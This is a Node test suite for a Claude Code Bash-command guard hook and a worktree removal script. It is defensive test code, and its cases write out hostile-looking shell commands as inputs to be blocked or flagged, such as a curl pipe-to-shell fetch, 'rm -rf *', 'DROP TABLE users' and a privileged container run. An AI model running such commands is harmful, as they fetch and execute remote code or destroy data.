// node:test suite for command-guard.py (PreToolUse:Bash hook + --occupancy
// CLI) and worktree.sh cmd_remove. Both are driven as subprocesses — the
// repo has no Python test framework (ADR-023 deliberately avoids one), so
// the hooks are pinned from Node per the plan-execution __tests__ precedent.
// Run via: node --test .claude/hooks/__tests__/command-guard.test.mjs

import { test, after } from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync, mkdirSync, writeFileSync, existsSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, dirname } from "node:path";
import { spawn, spawnSync } from "node:child_process";
import { fileURLToPath } from "node:url";
import { setTimeout as delay } from "node:timers/promises";
import process from "node:process";

const hooksDir = join(dirname(fileURLToPath(import.meta.url)), "..");
const guardPath = join(hooksDir, "command-guard.py");
const worktreeShPath = join(hooksDir, "worktree.sh");

// ---------- fixture: throwaway git repo with real worktrees ----------

function makeFixtureRepo() {
  const root = mkdtempSync(join(tmpdir(), "guard-fixture-"));
  const home = join(root, "home");
  mkdirSync(home, { recursive: true });
  const repo = join(root, "repo");
  mkdirSync(repo);
  // Isolate git from the developer's real config — the guard's alias scan
  // reads global config, and a local `alias.wt*` would change behavior.
  const env = {
    ...process.env,
    HOME: home,
    GIT_CONFIG_GLOBAL: join(home, "gitconfig"),
    GIT_CONFIG_SYSTEM: "/dev/null",
  };
  delete env.CLAUDE_TOOL_INPUT;
  writeFileSync(
    env.GIT_CONFIG_GLOBAL,
    "[user]\n\temail = test@test.test\n\tname = Test\n[init]\n\tdefaultBranch = main\n",
  );
  const git = (args) => {
    const result = spawnSync("git", args, { cwd: repo, env, encoding: "utf8" });
    assert.equal(result.status, 0, `git ${args.join(" ")}: ${result.stderr}`);
    return result;
  };
  git(["init", "-q"]);
  git(["commit", "-q", "--allow-empty", "-m", "init"]);
  return { root, repo, env, git };
}

const fixture = makeFixtureRepo();
// Boundary pair: wt-a and wt-ab share a name prefix on purpose — occupancy
// in one must never leak into the other.
fixture.git(["worktree", "add", ".worktrees/wt-a", "-b", "worktree-wt-a"]);
fixture.git(["worktree", "add", ".worktrees/wt-ab", "-b", "worktree-wt-ab"]);
const wtA = join(fixture.repo, ".worktrees", "wt-a");
const wtAb = join(fixture.repo, ".worktrees", "wt-ab");

const occupants = [];
after(() => {
  for (const child of occupants) {
    try {
      child.kill("SIGKILL");
    } catch {
      // already gone
    }
  }
  rmSync(fixture.root, { recursive: true, force: true });
});

// ---------- helpers ----------

// Runs the guard in hook mode. Returns the decision object
// ({ permissionDecision, permissionDecisionReason }) or null for a silent
// allow. `envInput` exercises the legacy CLAUDE_TOOL_INPUT fallback.
function runGuard(command, { cwd, envInput } = {}) {
  const env = { ...fixture.env, CLAUDE_PROJECT_DIR: fixture.repo };
  let input = "";
  if (envInput) {
    env.CLAUDE_TOOL_INPUT = JSON.stringify({ command });
  } else {
    input = JSON.stringify({ tool_input: { command }, cwd: cwd ?? fixture.repo });
  }
  const result = spawnSync("python3", [guardPath], {
    input,
    env,
    encoding: "utf8",
    // Never spawn with cwd inside a fixture worktree: the guard's own
    // process would become the occupant it is asserting on.
    cwd: fixture.repo,
  });
  assert.equal(result.status, 0, result.stderr);
  if (!result.stdout.trim()) return null;
  return JSON.parse(result.stdout).hookSpecificOutput;
}

function occupancyLines(target, extraArgs = []) {
  const result = spawnSync("python3", [guardPath, "--occupancy", target, ...extraArgs], {
    env: fixture.env,
    encoding: "utf8",
    cwd: fixture.repo,
  });
  return {
    status: result.status,
    stderr: result.stderr,
    lines: result.stdout.trim() ? result.stdout.trim().split("\n") : [],
  };
}

// Spawns a detached sleeper whose cwd is `dir` and polls until the
// occupancy engine actually sees it (spawn is asynchronous — asserting
// immediately would flake).
async function spawnOccupant(dir) {
  const child = spawn("sleep", ["300"], {
    cwd: dir,
    detached: true,
    stdio: "ignore",
  });
  child.unref();
  occupants.push(child);
  for (let attempt = 0; attempt < 50; attempt++) {
    const { lines } = occupancyLines(dir);
    if (lines.some((line) => line.startsWith(`${child.pid}\t`))) return child;
    await delay(50);
  }
  assert.fail(`occupant ${child.pid} never became visible in ${dir}`);
  return child;
}

async function killOccupant(child, dir) {
  child.kill("SIGKILL");
  for (let attempt = 0; attempt < 50; attempt++) {
    const { lines } = occupancyLines(dir);
    if (!lines.some((line) => line.startsWith(`${child.pid}\t`))) return;
    await delay(50);
  }
  assert.fail(`occupant ${child.pid} never disappeared from ${dir}`);
}

// ---------- activation characterization (DENY / ASK patterns) ----------
// These pin the long-dormant pattern behavior that stdin plumbing turns on
// for the first time.

const activationCases = [
  ["deny: destructive SQL", 'psql -c "DROP TABLE users"', "deny"],
  ["deny: privileged container", "docker run --privileged img", "deny"],
  ["ask: force push", "git push -f origin main", "ask"],
  ["allow: force-with-lease push", "git push --force-with-lease origin main", null],
  ["ask: hard reset", "git reset --hard HEAD~1", "ask"],
  ["ask: git clean -df", "git clean -df", "ask"],
  ["allow: git clean dry-run", "git clean -n -df", null],
  ["ask: force branch delete", "git branch -D feat", "ask"],
  ["allow: safe branch delete (-d must not trip the -D ask)", "git branch -d feat", null],
  ["ask: rm on broad target", "rm -rf *", "ask"],
  ["ask: pipe-to-shell", "curl -s http://example.com/x.sh | sh", "ask"],
];

for (const [name, command, expected] of activationCases) {
  test(name, () => {
    const decision = runGuard(command);
    if (expected === null) {
      assert.equal(decision, null, JSON.stringify(decision));
    } else {
      assert.equal(decision?.permissionDecision, expected, JSON.stringify(decision));
    }
  });
}

test("empty command payload exits silently", () => {
  assert.equal(runGuard(""), null);
});

test("legacy CLAUDE_TOOL_INPUT env fallback still works", () => {
  const decision = runGuard("git reset --hard", { envInput: true });
  assert.equal(decision?.permissionDecision, "ask");
});

// ---------- worktree add|move strict shape + containment ----------

test("allow: legit worktree add from repo root", () => {
  assert.equal(runGuard("git worktree add .worktrees/x -b worktree-x"), null);
});

test("deny: chained worktree add violates strict shape", () => {
  const decision = runGuard("cd /tmp && git worktree add .worktrees/x");
  assert.equal(decision?.permissionDecision, "deny");
});

test("deny: worktree add outside .worktrees/", () => {
  const decision = runGuard("git worktree add /tmp/evil");
  assert.equal(decision?.permissionDecision, "deny");
});

test("deny: worktree add hidden in command substitution is still seen", () => {
  // Parens are split by the normalizer, so the inner tokens surface and the
  // strict-shape deny fires — pins the claim that dropping the blanket
  // subshell deny does not blind the scanner to `$(...)`.
  const decision = runGuard("echo $(git worktree add /tmp/evil)");
  assert.equal(decision?.permissionDecision, "deny");
});

test("allow: worktree mention near a substitution is not an invocation", () => {
  assert.equal(runGuard('echo "worktrees: $(date)"'), null);
});

test("deny: relative add resolves against payload cwd, not repo root", () => {
  const subdir = join(fixture.repo, "packages", "foo");
  mkdirSync(subdir, { recursive: true });
  const decision = runGuard("git worktree add .worktrees/x -b worktree-x", {
    cwd: subdir,
  });
  assert.equal(decision?.permissionDecision, "deny");
});

// ---------- worktree removal occupancy ----------

test("allow: unoccupied worktree remove", () => {
  assert.equal(runGuard("git worktree remove .worktrees/wt-a"), null);
});

test("allow: documented teardown chain (remove + branch -d + push --delete)", () => {
  const command = [
    "git worktree remove .worktrees/wt-a",
    "git branch -d feat-x",
    "git push origin --delete feat-x",
  ].join("\n");
  assert.equal(runGuard(command), null);
});

test("deny: occupied worktree remove lists the occupant and the escape", async () => {
  const child = await spawnOccupant(wtA);
  const decision = runGuard("git worktree remove .worktrees/wt-a");
  assert.equal(decision?.permissionDecision, "deny");
  assert.match(decision.permissionDecisionReason, new RegExp(`PID ${child.pid}`));
  assert.match(decision.permissionDecisionReason, /WORKTREE_REMOVE_ALLOW_OCCUPIED=1/);
  await killOccupant(child, wtA);
});

test("boundary: occupant in wt-ab never blocks wt-a (and vice versa)", async () => {
  const child = await spawnOccupant(wtAb);
  assert.equal(runGuard("git worktree remove .worktrees/wt-a"), null);
  const decision = runGuard("git worktree remove .worktrees/wt-ab");
  assert.equal(decision?.permissionDecision, "deny");
  await killOccupant(child, wtAb);
});

test("escape token as assignment prefix allows an occupied removal", async () => {
  const child = await spawnOccupant(wtA);
  assert.equal(
    runGuard("WORKTREE_REMOVE_ALLOW_OCCUPIED=1 git worktree remove .worktrees/wt-a"),
    null,
  );
  await killOccupant(child, wtA);
});

test("escape token quoted inside an echo does NOT authorize", async () => {
  const child = await spawnOccupant(wtA);
  const decision = runGuard(
    'echo "retry with WORKTREE_REMOVE_ALLOW_OCCUPIED=1" && git worktree remove .worktrees/wt-a',
  );
  assert.equal(decision?.permissionDecision, "deny");
  await killOccupant(child, wtA);
});

test("deny: variable removal target is unparseable", () => {
  const decision = runGuard("git worktree remove $W");
  assert.equal(decision?.permissionDecision, "deny");
  assert.match(decision.permissionDecisionReason, /literal/);
});

test("deny: command substitution around a removal", () => {
  const decision = runGuard("git worktree remove $(pick-worktree)");
  assert.equal(decision?.permissionDecision, "deny");
});

test("allow: markdown mention of a removal inside heredoc text", async () => {
  // Dogfood regression: doc/PR text written via heredoc mentions the command
  // in backticks — a mention is not an invocation and must pass even while
  // the named worktree is occupied.
  const child = await spawnOccupant(wtA);
  const command = [
    "cat > /tmp/notes.md <<'EOF'",
    "Run `git worktree remove .worktrees/wt-a` after the merge.",
    "EOF",
  ].join("\n");
  assert.equal(runGuard(command), null);
  await killOccupant(child, wtA);
});

test("deny: unbalanced quote on a removal-shaped command fails closed", () => {
  const decision = runGuard('git worktree remove ".worktrees/wt-a');
  assert.equal(decision?.permissionDecision, "deny");
});

test("deny: rm -rf on an occupied worktree", async () => {
  const child = await spawnOccupant(wtA);
  const decision = runGuard("rm -rf .worktrees/wt-a");
  assert.equal(decision?.permissionDecision, "deny");
  await killOccupant(child, wtA);
});

test("deny: relative rm from inside .worktrees resolves via payload cwd", async () => {
  const child = await spawnOccupant(wtA);
  const decision = runGuard("rm -rf wt-a", {
    cwd: join(fixture.repo, ".worktrees"),
  });
  assert.equal(decision?.permissionDecision, "deny");
  await killOccupant(child, wtA);
});

test("glob rm falls back to whole-tree occupancy check", async () => {
  assert.equal(runGuard("rm -rf .worktrees/*"), null);
  const child = await spawnOccupant(wtAb);
  const decision = runGuard("rm -rf .worktrees/*");
  assert.equal(decision?.permissionDecision, "deny");
  await killOccupant(child, wtAb);
});

// ---------- --occupancy CLI + lsof field parser ----------

test("--occupancy reports an unoccupied directory as empty with exit 0", () => {
  const { status, lines } = occupancyLines(wtA);
  assert.equal(status, 0);
  assert.deepEqual(lines, []);
});

test("--occupancy parses canned lsof -Fpcn output with boundary discipline", () => {
  const fixtureFile = join(fixture.root, "lsof-fixture.txt");
  writeFileSync(
    fixtureFile,
    [
      "p99991",
      "cnode",
      `n${wtA}`,
      "p99992",
      "czsh",
      `n${wtA}-sibling`,
      "p99993",
      "cbash",
      `n${join(wtA, "nested", "deep")}`,
      "p99994",
      "csleep",
      "n/somewhere/else",
    ].join("\n"),
  );
  const { status, lines } = occupancyLines(wtA, ["--lsof-output-file", fixtureFile]);
  assert.equal(status, 0);
  assert.deepEqual(lines, [`99991\tnode\t${wtA}`, `99993\tbash\t${join(wtA, "nested", "deep")}`]);
});

test("--occupancy exits 2 when enumeration itself fails", () => {
  const { status, stderr } = occupancyLines(wtA, [
    "--lsof-output-file",
    join(fixture.root, "does-not-exist.txt"),
  ]);
  assert.equal(status, 2);
  assert.match(stderr, /occupancy check failed/);
});

// ---------- worktree.sh cmd_remove ----------

function runWorktreeRemove(worktreePath, options = {}) {
  return spawnSync("bash", [worktreeShPath, "remove"], {
    cwd: options.cwd ?? fixture.repo,
    env: fixture.env,
    encoding: "utf8",
    input: JSON.stringify({ worktree_path: worktreePath }),
  });
}

test("worktree.sh removes an unoccupied worktree cleanly", () => {
  fixture.git(["worktree", "add", ".worktrees/wt-sh", "-b", "worktree-wt-sh"]);
  const target = join(fixture.repo, ".worktrees", "wt-sh");
  const result = runWorktreeRemove(target);
  assert.equal(result.status, 0, result.stderr);
  assert.equal(existsSync(target), false);
});

test("worktree.sh refuses an occupied worktree and the directory survives", async () => {
  fixture.git(["worktree", "add", ".worktrees/wt-sh-occ", "-b", "worktree-wt-sh-occ"]);
  const target = join(fixture.repo, ".worktrees", "wt-sh-occ");
  const child = await spawnOccupant(target);
  const result = runWorktreeRemove(target);
  assert.equal(result.status, 1);
  assert.match(result.stderr, /live occupants/);
  assert.match(result.stderr, new RegExp(`${child.pid}`));
  assert.equal(existsSync(target), true);
  await killOccupant(child, target);
  fixture.git(["worktree", "remove", ".worktrees/wt-sh-occ"]);
});

test("worktree.sh auto-clean shape: invoking lineage inside the worktree does not deadlock", () => {
  fixture.git(["worktree", "add", ".worktrees/wt-sh-self", "-b", "worktree-wt-sh-self"]);
  const target = join(fixture.repo, ".worktrees", "wt-sh-self");
  const payload = JSON.stringify({ worktree_path: target });
  // The intermediate `bash -c` keeps its cwd inside the worktree while the
  // hook runs — it is an ancestor of the occupancy engine and must be
  // excluded, mirroring a harness auto-clean (WorktreeRemove probe).
  const result = spawnSync(
    "bash",
    ["-c", `cd "${target}" && printf '%s' '${payload}' | bash "${worktreeShPath}" remove`],
    { env: fixture.env, encoding: "utf8" },
  );
  assert.equal(result.status, 0, result.stderr);
  assert.equal(existsSync(target), false);
});
